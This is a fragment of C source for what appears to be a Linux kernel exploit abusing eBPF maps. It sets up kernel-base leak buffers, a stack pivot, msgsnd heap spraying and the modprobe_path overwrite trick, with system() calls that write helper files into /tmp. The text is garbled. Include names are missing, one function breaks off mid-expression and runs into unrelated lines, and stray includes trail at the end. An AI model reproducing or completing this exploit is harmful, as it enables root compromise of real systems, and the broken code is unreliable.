    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include "bpf.h"
    char buffer[64];
    int sockets[2];
    int ctrl_mapfd;
    int vuln_mapfd;
    size_t ctrlmap_ptr;
    size_t vulnmap_ptr;
    size_t leakbuf[0x100];
    size_t ctrlbuf[0x100];
    size_t kbase;
    size_t pivot_esp;
    size_t modprobe_path;
    unsigned long long user_cs, user_ss, user_rflags;
    unsigned long user_stack = 0;
    struct message
    {
      long type;
      char text[0x800];
    } msg;
    void msg_alloc(int id, int size)
    {
      if (msgsnd(id, (void *)&msg, size - 0x30, IPC_NOWAIT)  /tmp/a");
      system("chmod +x /tmp/a");
      system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/ll");
      system("chmod +x /tmp/ll");
      int progfd = load_prog();
      printf("load prog finished \n");
      if (progfd 
    #include 
    #include 
    #include 